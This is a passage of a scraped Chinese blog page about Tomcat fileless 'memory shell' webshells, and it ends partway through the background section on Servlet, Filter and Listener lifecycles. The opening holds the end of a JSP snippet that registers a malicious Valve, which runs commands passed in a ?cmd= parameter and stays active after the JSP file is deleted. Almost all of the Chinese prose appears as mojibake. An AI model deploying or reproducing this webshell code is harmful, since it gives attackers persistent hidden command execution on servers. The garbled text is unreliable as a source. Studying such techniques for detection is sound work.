Scanner(in).useDelimiter(\"\\\\A\"); String output = s.hasNext() ? s.next() : \"\"; response.getWriter().write(\"Tomcat valve Injection Success !\"+output); response.getWriter().flush(); this.getNext().invoke(request, response); } } catch (Exception e) { e.printStackTrace(); } } }; standardPipeline.addValve(valveBase); %\u003e debugè°ƒè¯•ï¼Œå¯ä»¥å‘ç°å·²æˆåŠŸæ·»åŠ valveåˆ°ç»„ä»¶ä¸­ï¼Œ\nåœ¨å·²çŸ¥è·¯å¾„ä¸‹åŠ ?cmd=commandå³å¯æ‰§è¡Œå‘½ä»¤ã€‚\næ€»ç»“ è¿™é‡Œå†…å­˜é©¬çš„æ„æ€æ˜¯ï¼Œæˆ‘ä»¬è®¿é—®evil.jspä¹‹åï¼Œå°†jspæ–‡ä»¶åˆ é™¤ä¹‹åï¼ŒæœåŠ¡å™¨åªè¦ä¸é‡å¯ï¼Œæˆ‘ä»¬æ·»åŠ è¿›å»çš„æ¶æ„ç»„ä»¶å°±å¯ä»¥ä¸€ç›´è¿è¡Œï¼Œè®¿é—®ä¸Šä¸‹æ–‡ç¯å¢ƒå°±èƒ½ç›´æ¥å¸¦ä¸Šå‚æ•°å‘½ä»¤æ‰§è¡Œã€‚\nä½†æ˜¯è¿™ç§å®ç°æ–¹å¼ä¸¥æ ¼æ„ä¹‰ä¸Šä¸ç®—å†…å­˜é©¬ï¼Œåªæ˜¯çœ‹èµ·æ¥æ²¡äº†æ–‡ä»¶è€Œå·²ï¼Œå› ä¸º Web æœåŠ¡å™¨ä¸­çš„ jsp ç¼–è¯‘å™¨ä¼šç¼–è¯‘ç”Ÿæˆå¯¹åº”çš„ java æ–‡ä»¶ç„¶åè¿›è¡Œç¼–è¯‘åŠ è½½å¹¶å®ä¾‹åŒ–ï¼Œæ‰€ä»¥å®é™…ä¸Šè¿˜æ˜¯ä¼šè½åœ°çš„ï¼Œå¦‚ä¸‹å›¾ï¼š\nä¹‹åä¼šå­¦ä¹ åˆ©ç”¨ååºåˆ—åŒ–æ¥å®ç°çœŸæ­£æ„ä¹‰ä¸Šçš„å†…å­˜é©¬çš„æ³¨å…¥ï¼Œä»¥åŠé€šè¿‡agentæŠ€æœ¯å®ç°æ³¨å…¥å†…å­˜é©¬ã€‚\nå‚è€ƒ https://xz.aliyun.com/t/11988\nhttps://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w\nhttp://wjlshare.com/archives/1541\nhttps://su18.org/post/memory-shell/\nhttps://github.com/su18/MemoryShell/tree/main/\n",
  "wordCount" : "11027",
  "inLanguage": "en",
  "datePublished": "2023-04-15T14:38:38+08:00",
  "dateModified": "2023-04-15T14:38:38+08:00",
  "author":[{
    "@type": "Person",
    "name": "Reus09"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "/posts/tech/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Reus09's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="" accesskey="h" title="Reus09&#39;s Blog (Alt + H)">Reus09&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="posts" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="archives/" title="Archives">
                    <span>Archives</span>
                </a>
            </li>
            <li>
                <a href="categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="about" title="About">
                    <span>About</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="">Home</a>&nbsp;Â»&nbsp;<a href="/posts/">ğŸ“šæ–‡ç« </a>&nbsp;Â»&nbsp;<a href="/posts/tech/">ğŸ‘¨ğŸ»â€ğŸ’»æŠ€æœ¯</a></div>
    <h1 class="post-title">
      Tomcatå†…å­˜é©¬
    </h1>
    <div class="post-meta"><span title='2023-04-15 14:38:38 +0800 +0800'>2023-04-15</span>&nbsp;Â·&nbsp;23 min&nbsp;Â·&nbsp;Reus09

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e5%89%8d%e8%a8%80" aria-label="å‰è¨€">å‰è¨€</a></li>
                    <li>
                        <a href="#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" aria-label="åŸºç¡€çŸ¥è¯†">åŸºç¡€çŸ¥è¯†</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#container-%e5%ae%b9%e5%99%a8%e7%bb%84%e4%bb%b6" aria-label="Container-å®¹å™¨ç»„ä»¶">Container-å®¹å™¨ç»„ä»¶</a></li>
                    <li>
                        <a href="#filter-servlet-listener" aria-label="Filter Servlet Listener">Filter Servlet Listener</a><ul>
                            
                    <li>
                        <a href="#servlet" aria-label="Servlet:">Servlet:</a><ul>
                            
                    <li>
                        <a href="#servlet%e7%9a%84%e7%94%9f%e5%91%bd%e5%91%a8%e6%9c%9f" aria-label="Servletçš„ç”Ÿå‘½å‘¨æœŸï¼š">Servletçš„ç”Ÿå‘½å‘¨æœŸï¼š</a></li></ul>
                    </li>
                    <li>
                        <a href="#filter" aria-label="Filter:">Filter:</a><ul>
                            
                    <li>
                        <a href="#filter%e7%9a%84%e7%94%9f%e5%91%bd%e5%91%a8%e6%9c%9f" aria-label="Filterçš„ç”Ÿå‘½å‘¨æœŸï¼š">Filterçš„ç”Ÿå‘½å‘¨æœŸï¼š</a></li></ul>
                    </li>
                    <li>
                        <a href="#listener" aria-label="Listener">Listener</a><ul>
                            
                    <li>
                        <a href="#listener%e7%9a%84%e7%94%9f%e5%91%bd%e5%91%a8%e6%9c%9f" aria-label="Listenerçš„ç”Ÿå‘½å‘¨æœŸï¼š">Listenerçš„ç”Ÿå‘½å‘¨æœŸï¼š</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#servletcontext%e4%b8%8estandardcontext%e7%9a%84%e5%85%b3%e7%b3%bb" aria-label="ServletContextä¸StandardContextçš„å…³ç³»">ServletContextä¸StandardContextçš„å…³ç³»</a><ul>
                            
                    <li>
                        <a href="#%e5%a6%82%e4%bd%95%e8%8e%b7%e5%8f%96standardcontext" aria-label="å¦‚ä½•è·å–StandardContext">å¦‚ä½•è·å–StandardContext</a></li></ul>
                    </li></ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="å†…å­˜é©¬">å†…å­˜é©¬</a><ul>
                            
                    <li>
                        <a href="#filter%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Filterå†…å­˜é©¬">Filterå†…å­˜é©¬</a><ul>
                            
                    <li>
                        <a href="#%e6%b3%a8%e5%86%8c%e6%b5%81%e7%a8%8b" aria-label="æ³¨å†Œæµç¨‹">æ³¨å†Œæµç¨‹</a></li>
                    <li>
                        <a href="#filter%e8%b0%83%e7%94%a8%e9%93%be" aria-label="Filterè°ƒç”¨é“¾">Filterè°ƒç”¨é“¾</a></li>
                    <li>
                        <a href="#%e5%88%a9%e7%94%a8%e8%bf%87%e7%a8%8b" aria-label="åˆ©ç”¨è¿‡ç¨‹">åˆ©ç”¨è¿‡ç¨‹</a><ul>
                            
                    <li>
                        <a href="#%e5%88%9b%e5%bb%ba%e6%81%b6%e6%84%8ffilter" aria-label="åˆ›å»ºæ¶æ„Filter">åˆ›å»ºæ¶æ„Filter</a></li>
                    <li>
                        <a href="#%e5%b0%81%e8%a3%85filterdef" aria-label="å°è£…FilterDef">å°è£…FilterDef</a></li>
                    <li>
                        <a href="#%e6%b7%bb%e5%8a%a0%e5%88%b0-filterdefs-%e5%92%8c-filterconfig" aria-label="æ·»åŠ åˆ° FilterDefs å’Œ FilterConfig">æ·»åŠ åˆ° FilterDefs å’Œ FilterConfig</a></li>
                    <li>
                        <a href="#filtermaps" aria-label="FilterMaps">FilterMaps</a></li>
                    <li>
                        <a href="#%e6%95%88%e6%9e%9c" aria-label="æ•ˆæœ">æ•ˆæœ</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#servlet%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Servletå†…å­˜é©¬">Servletå†…å­˜é©¬</a><ul>
                            
                    <li>
                        <a href="#servlet%e8%b0%83%e7%94%a8%e9%93%be" aria-label="Servletè°ƒç”¨é“¾">Servletè°ƒç”¨é“¾</a></li>
                    <li>
                        <a href="#%e5%88%a9%e7%94%a8%e8%bf%87%e7%a8%8b-1" aria-label="åˆ©ç”¨è¿‡ç¨‹">åˆ©ç”¨è¿‡ç¨‹</a><ul>
                            
                    <li>
                        <a href="#%e8%8e%b7%e5%8f%96context" aria-label="è·å–Context">è·å–Context</a></li>
                    <li>
                        <a href="#%e7%94%9f%e6%88%90%e6%81%b6%e6%84%8fservlet" aria-label="ç”Ÿæˆæ¶æ„Servlet">ç”Ÿæˆæ¶æ„Servlet</a></li>
                    <li>
                        <a href="#%e7%94%9f%e6%88%90wrapper" aria-label="ç”Ÿæˆwrapper">ç”Ÿæˆwrapper</a></li>
                    <li>
                        <a href="#%e6%b7%bb%e5%8a%a0%e6%98%a0%e5%b0%84" aria-label="æ·»åŠ æ˜ å°„">æ·»åŠ æ˜ å°„</a></li>
                    <li>
                        <a href="#%e6%95%88%e6%9e%9c-1" aria-label="æ•ˆæœ">æ•ˆæœ</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#listener%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Listenerå†…å­˜é©¬">Listenerå†…å­˜é©¬</a><ul>
                            
                    <li>
                        <a href="#listener%e8%b0%83%e7%94%a8%e8%bf%87%e7%a8%8b" aria-label="Listenerè°ƒç”¨è¿‡ç¨‹">Listenerè°ƒç”¨è¿‡ç¨‹</a></li>
                    <li>
                        <a href="#%e5%88%a9%e7%94%a8%e8%bf%87%e7%a8%8b-2" aria-label="åˆ©ç”¨è¿‡ç¨‹">åˆ©ç”¨è¿‡ç¨‹</a><ul>
                            
                    <li>
                        <a href="#%e8%8e%b7%e5%8f%96context-1" aria-label="è·å–Context">è·å–Context</a></li>
                    <li>
                        <a href="#%e7%94%9f%e6%88%90%e6%81%b6%e6%84%8flistener" aria-label="ç”Ÿæˆæ¶æ„listener">ç”Ÿæˆæ¶æ„listener</a></li>
                    <li>
                        <a href="#%e6%b7%bb%e5%8a%a0listener" aria-label="æ·»åŠ listener">æ·»åŠ listener</a></li>
                    <li>
                        <a href="#%e6%95%88%e6%9e%9c-2" aria-label="æ•ˆæœ">æ•ˆæœ</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#tomcat-valve%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Tomcat valveå†…å­˜é©¬">Tomcat valveå†…å­˜é©¬</a><ul>
                            
                    <li>
                        <a href="#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86-1" aria-label="åŸºç¡€çŸ¥è¯†">åŸºç¡€çŸ¥è¯†</a></li>
                    <li>
                        <a href="#valve%e7%9a%84%e7%94%9f%e6%88%90%e5%92%8c%e9%85%8d%e7%bd%ae" aria-label="valveçš„ç”Ÿæˆå’Œé…ç½®">valveçš„ç”Ÿæˆå’Œé…ç½®</a><ul>
                            
                    <li>
                        <a href="#%e6%96%b0%e5%bb%bavalve" aria-label="æ–°å»ºvalve">æ–°å»ºvalve</a></li>
                    <li>
                        <a href="#%e6%b3%a8%e5%86%8cvalve" aria-label="æ³¨å†Œvalve">æ³¨å†Œvalve</a></li>
                    <li>
                        <a href="#%e8%b0%83%e7%94%a8valve" aria-label="è°ƒç”¨valve">è°ƒç”¨valve</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e5%88%a9%e7%94%a8%e8%bf%87%e7%a8%8b-3" aria-label="åˆ©ç”¨è¿‡ç¨‹">åˆ©ç”¨è¿‡ç¨‹</a><ul>
                            
                    <li>
                        <a href="#%e8%8e%b7%e5%8f%96context-2" aria-label="è·å–context">è·å–context</a></li>
                    <li>
                        <a href="#%e5%8f%8d%e5%b0%84%e8%8e%b7%e5%8f%96standardpipeline" aria-label="åå°„è·å–StandardPipeline">åå°„è·å–StandardPipeline</a></li>
                    <li>
                        <a href="#%e5%88%9b%e5%bb%ba%e6%b3%a8%e5%86%8c%e6%81%b6%e6%84%8fvalve%e5%b9%b6%e6%b7%bb%e5%8a%a0%e8%bf%9bstandardpipeline" aria-label="åˆ›å»ºæ³¨å†Œæ¶æ„valveå¹¶æ·»åŠ è¿›standardPipeline">åˆ›å»ºæ³¨å†Œæ¶æ„valveå¹¶æ·»åŠ è¿›standardPipeline</a></li>
                    <li>
                        <a href="#%e6%95%88%e6%9e%9c-3" aria-label="æ•ˆæœ">æ•ˆæœ</a></li></ul>
                    </li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#%e6%80%bb%e7%bb%93" aria-label="æ€»ç»“">æ€»ç»“</a></li>
                    <li>
                        <a href="#%e5%8f%82%e8%80%83" aria-label="å‚è€ƒ">å‚è€ƒ</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
         
         activeElement = elements[0];
         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
     }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
             const id = encodeURI(element.getAttribute('id')).toLowerCase();
             if (element === activeElement){
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
             } else {
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
             }
         })
     }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
</script>

  <div class="post-content"><h2 id="å‰è¨€">å‰è¨€<a hidden class="anchor" aria-hidden="true" href="#å‰è¨€">#</a></h2>
<p>å†…å­˜é©¬åˆåæ— æ–‡ä»¶é©¬ï¼Œå°±æ˜¯æ— æ–‡ä»¶è½åœ°çš„webshellæŠ€æœ¯ã€‚æ˜¯ç”±äº webshell ç‰¹å¾è¯†åˆ«ã€é˜²ç¯¡æ”¹ã€ç›®å½•ç›‘æ§ç­‰ç­‰é’ˆå¯¹ web åº”ç”¨ç›®å½•æˆ–æœåŠ¡å™¨æ–‡ä»¶é˜²å¾¡æ‰‹æ®µçš„ä»‹å…¥ï¼Œå¯¼è‡´çš„æ–‡ä»¶ shell éš¾ä»¥å†™å…¥å’ŒæŒä¹…è€Œè¡ç”Ÿå‡ºçš„ä¸€ç§â€œæ¦‚å¿µå‹â€æœ¨é©¬ã€‚è¿™ç§æŠ€æœ¯çš„æ ¸å¿ƒæ€æƒ³éå¸¸ç®€å•ï¼Œä¸€å¥è¯å°±èƒ½æ¦‚æ‹¬ï¼Œé‚£å°±æ˜¯å¯¹è®¿é—®è·¯å¾„æ˜ å°„åŠç›¸å…³å¤„ç†ä»£ç çš„åŠ¨æ€æ³¨å†Œã€‚</p>
<p>ç›®å‰å†…å­˜é©¬ä¸»è¦åˆ†ä¸ºä¸€ä¸‹å‡ ç§ï¼š</p>
<ul>
<li>åŠ¨æ€æ³¨å†Œ servlet/filter/listenerï¼ˆä½¿ç”¨ servlet-api çš„å…·ä½“å®ç°ï¼‰</li>
<li>åŠ¨æ€æ³¨å†Œ interceptor/controllerï¼ˆä½¿ç”¨æ¡†æ¶å¦‚ spring/struts2ï¼‰</li>
<li>åŠ¨æ€æ³¨å†Œä½¿ç”¨<strong>èŒè´£é“¾</strong>è®¾è®¡æ¨¡å¼çš„ä¸­é—´ä»¶ã€æ¡†æ¶çš„å®ç°ï¼ˆä¾‹å¦‚ Tomcat çš„ Pipeline &amp; Valveï¼ŒGrizzly çš„ FilterChain &amp; Filter ç­‰ç­‰ï¼‰</li>
<li>ä½¿ç”¨ java agent æŠ€æœ¯å†™å…¥å­—èŠ‚ç </li>
</ul>
<p>æœ¬æ–‡ç®€å•å­¦ä¹ ä¸€ä¸‹servlet-apiç›¸å…³å®ç°çš„å†…å­˜é©¬åŸç†ã€‚</p>
<h2 id="åŸºç¡€çŸ¥è¯†">åŸºç¡€çŸ¥è¯†<a hidden class="anchor" aria-hidden="true" href="#åŸºç¡€çŸ¥è¯†">#</a></h2>
<h4 id="container-å®¹å™¨ç»„ä»¶">Container-å®¹å™¨ç»„ä»¶<a hidden class="anchor" aria-hidden="true" href="#container-å®¹å™¨ç»„ä»¶">#</a></h4>
<p>Tomcatæœ‰å››ç±»å®¹å™¨ç»„ä»¶ï¼Œä»ä¸Šè‡³ä¸‹ä¾æ¬¡æ˜¯ï¼š</p>
<ol>
<li>Engineï¼Œå®ç°ç±»ä¸º <code>org.apache.catalina.core.StandardEngine</code></li>
<li>Hostï¼Œå®ç°ç±»ä¸º<code> org.apache.catalina.core.StandardHost</code></li>
<li>Contextï¼Œå®ç°ç±»ä¸º <code>org.apache.catalina.core.StandardContext</code></li>
<li>Wrapperï¼Œå®ç°ç±»ä¸º<code> org.apache.catalina.core.StandardWrapper</code></li>
</ol>
<p>æ¯ä¸ªWrapperå®ä¾‹è¡¨ç¤ºä¸€ä¸ªå…·ä½“çš„Servletå®šä¹‰ï¼ŒStandardWrapperæ˜¯Wrapperæ¥å£çš„æ ‡å‡†å®ç°ç±»ï¼ˆStandardWrapper çš„ä¸»è¦ä»»åŠ¡å°±æ˜¯è½½å…¥Servletç±»å¹¶ä¸”è¿›è¡Œå®ä¾‹åŒ–ï¼‰</p>
<p>â€œä»ä¸Šè‡³ä¸‹â€ çš„æ„æ€æ˜¯ï¼Œå®ƒä»¬ä¹‹é—´æ˜¯å­˜åœ¨çˆ¶å­å…³ç³»çš„ã€‚</p>
<ul>
<li>Engineï¼šæœ€é¡¶å±‚å®¹å™¨ç»„ä»¶ï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ª Hostã€‚</li>
<li>Hostï¼šä¸€ä¸ª Host ä»£è¡¨ä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ª Contextã€‚</li>
<li>Contextï¼šä¸€ä¸ª Context ä»£è¡¨ä¸€ä¸ª Web åº”ç”¨ï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ª Wrapperã€‚</li>
<li>Wrapperï¼šä¸€ä¸ª Wrapper ä»£è¡¨ä¸€ä¸ª Servletã€‚</li>
</ul>
<p>è¿™äº›é…ç½®ä¿¡æ¯æ˜¯å¤šå±‚æ¬¡çš„Mapã€‚æ ¹æ®è¯·æ±‚å®šä½åˆ°æŒ‡å®šservletçš„æµç¨‹å›¾å¦‚ä¸‹:</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image1622447564_60b495cc4ddf6ab5c7b98.jpeg" alt="img"  />
</p>
<h4 id="filter-servlet-listener">Filter Servlet Listener<a hidden class="anchor" aria-hidden="true" href="#filter-servlet-listener">#</a></h4>
<p>è¿™é‡Œç®€å•è®²ä¸€ä¸‹Tomcatä¸­æµé‡çš„è¯·æ±‚è·¯çº¿</p>
<ul>
<li>å®¢æˆ·ç«¯å‘èµ·çš„webè¯·æ±‚ä¼šä¾æ¬¡ç»è¿‡Listenerã€Filterã€Servletä¸‰ä¸ªç»„ä»¶</li>
</ul>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image1622447492_60b495848a64109842c17.jpeg" alt="img"  />
</p>
<h5 id="servlet">Servlet:<a hidden class="anchor" aria-hidden="true" href="#servlet">#</a></h5>
<p>Servlet æ˜¯è¿è¡Œåœ¨ Web æœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„ç¨‹åºï¼Œå®ƒæ˜¯ä½œä¸ºæ¥è‡ª HTTP å®¢æˆ·ç«¯çš„è¯·æ±‚å’Œ HTTP æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚å®ƒè´Ÿè´£å¤„ç†ç”¨æˆ·çš„è¯·æ±‚ï¼Œå¹¶æ ¹æ®è¯·æ±‚ç”Ÿæˆç›¸åº”çš„è¿”å›ä¿¡æ¯æä¾›ç»™ç”¨æˆ·ã€‚</p>
<h6 id="servletçš„ç”Ÿå‘½å‘¨æœŸ">Servletçš„ç”Ÿå‘½å‘¨æœŸï¼š<a hidden class="anchor" aria-hidden="true" href="#servletçš„ç”Ÿå‘½å‘¨æœŸ">#</a></h6>
<ul>
<li>Servlet çš„ç”Ÿå‘½å‘¨æœŸå¼€å§‹äºWebå®¹å™¨çš„å¯åŠ¨æ—¶ï¼Œå®ƒå°±ä¼šè¢«è½½å…¥åˆ°Webå®¹å™¨å†…å­˜ä¸­ï¼Œç›´åˆ°Webå®¹å™¨åœæ­¢è¿è¡Œæˆ–è€…é‡æ–°è£…å…¥servletæ—¶å€™ç»“æŸã€‚è¿™é‡Œä¹Ÿå°±æ˜¯è¯´æ˜ï¼Œä¸€æ—¦Servletè¢«è£…å…¥åˆ°Webå®¹å™¨ä¹‹åï¼Œä¸€èˆ¬æ˜¯ä¼šé•¿ä¹…é©»ç•™åœ¨Webå®¹å™¨ä¹‹ä¸­ã€‚
<ul>
<li>è£…å…¥ï¼šå¯åŠ¨æœåŠ¡å™¨æ—¶åŠ è½½Servletçš„å®ä¾‹</li>
<li>åˆå§‹åŒ–ï¼šwebæœåŠ¡å™¨å¯åŠ¨æ—¶æˆ–webæœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œæˆ–è€…ä¸¤è€…ä¹‹é—´çš„æŸä¸ªæ—¶åˆ»å¯åŠ¨ã€‚åˆå§‹åŒ–å·¥ä½œæœ‰init()æ–¹æ³•è´Ÿè´£æ‰§è¡Œå®Œæˆ</li>
<li>è°ƒç”¨ï¼šä»ç¬¬ä¸€æ¬¡åˆ°ä»¥åçš„å¤šæ¬¡è®¿é—®ï¼Œéƒ½æ˜¯åªè°ƒç”¨doGet()æˆ–doPost()æ–¹æ³•</li>
<li>é”€æ¯ï¼šåœæ­¢æœåŠ¡å™¨æ—¶è°ƒç”¨destroy()æ–¹æ³•ï¼Œé”€æ¯å®ä¾‹</li>
</ul>
</li>
</ul>
<h5 id="filter">Filter:<a hidden class="anchor" aria-hidden="true" href="#filter">#</a></h5>
<p>Filter æˆ‘ä»¬ç§°ä¹‹ä¸ºè¿‡æ»¤å™¨ï¼Œæ˜¯ Java ä¸­æœ€å¸¸è§ä¹Ÿæœ€å®ç”¨çš„æŠ€æœ¯ä¹‹ä¸€ï¼Œé€šå¸¸è¢«ç”¨æ¥å¤„ç†é™æ€ web èµ„æºã€è®¿é—®æƒé™æ§åˆ¶ã€è®°å½•æ—¥å¿—ç­‰é™„åŠ åŠŸèƒ½ç­‰ç­‰ã€‚ä¸€æ¬¡è¯·æ±‚è¿›å…¥åˆ°æœåŠ¡å™¨åï¼Œå°†å…ˆç”± Filter å¯¹ç”¨æˆ·è¯·æ±‚è¿›è¡Œé¢„å¤„ç†ï¼Œå†äº¤ç»™ Servletã€‚</p>
<h6 id="filterçš„ç”Ÿå‘½å‘¨æœŸ">Filterçš„ç”Ÿå‘½å‘¨æœŸï¼š<a hidden class="anchor" aria-hidden="true" href="#filterçš„ç”Ÿå‘½å‘¨æœŸ">#</a></h6>
<p>è‡ªå®šä¹‰Filterçš„å®ç°ï¼Œéœ€è¦å®ç°<code>javax.servlet.Filter</code>ä¸‹çš„init()ã€doFilter()ã€destroy()ä¸‰ä¸ªæ–¹æ³•ã€‚</p>
<ul>
<li>å¯åŠ¨æœåŠ¡å™¨æ—¶åŠ è½½è¿‡æ»¤å™¨çš„å®ä¾‹ï¼Œå¹¶è°ƒç”¨init()æ–¹æ³•æ¥åˆå§‹åŒ–å®ä¾‹ï¼›</li>
<li>æ¯ä¸€æ¬¡è¯·æ±‚æ—¶éƒ½åªè°ƒç”¨æ–¹æ³•doFilter()è¿›è¡Œå¤„ç†ï¼›</li>
<li>åœæ­¢æœåŠ¡å™¨æ—¶è°ƒç”¨destroy()æ–¹æ³•ï¼Œé”€æ¯å®ä¾‹ã€‚</li>
</ul>
<h5 id="listener">Listener<a hidden class="anchor" aria-hidden="true" href="#listener">#</a></h5>
<p>ç›‘å¬å™¨ï¼ˆListenerï¼‰å°±æ˜¯Applicationã€Sessionå’ŒRequestä¸‰å¤§å¯¹è±¡åˆ›å»ºã€é”€æ¯æˆ–è€…å¾€å…¶ä¸­æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤å±æ€§æ—¶è‡ªåŠ¨æ‰§è¡Œä»£ç çš„åŠŸèƒ½ç»„ä»¶ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€äº›å¸¸ç”¨çš„Listenerçš„ç”¨é€”</p>
<ul>
<li>ServletContextListenerï¼šå¯¹Servletä¸Šä¸‹æ–‡çš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ï¼›</li>
<li>ServletContextAttributeListenerï¼šç›‘å¬Servletä¸Šä¸‹æ–‡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢ï¼›</li>
<li>HttpSessionListenerï¼šå¯¹Sessionçš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ã€‚Sessionçš„é”€æ¯æœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ä¸ªä¸­Sessionè¶…æ—¶ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯é€šè¿‡è°ƒç”¨Sessionå¯¹è±¡çš„invalidate()æ–¹æ³•ä½¿sessionå¤±æ•ˆã€‚</li>
<li>HttpSessionAttributeListenerï¼šå¯¹Sessionå¯¹è±¡ä¸­å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ï¼›</li>
<li>ServletRequestListenerï¼šå¯¹è¯·æ±‚å¯¹è±¡çš„åˆå§‹åŒ–å’Œé”€æ¯è¿›è¡Œç›‘å¬ï¼›</li>
<li>ServletRequestAttributeListenerï¼šå¯¹è¯·æ±‚å¯¹è±¡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ã€‚</li>
</ul>
<h6 id="listenerçš„ç”Ÿå‘½å‘¨æœŸ">Listenerçš„ç”Ÿå‘½å‘¨æœŸï¼š<a hidden class="anchor" aria-hidden="true" href="#listenerçš„ç”Ÿå‘½å‘¨æœŸ">#</a></h6>
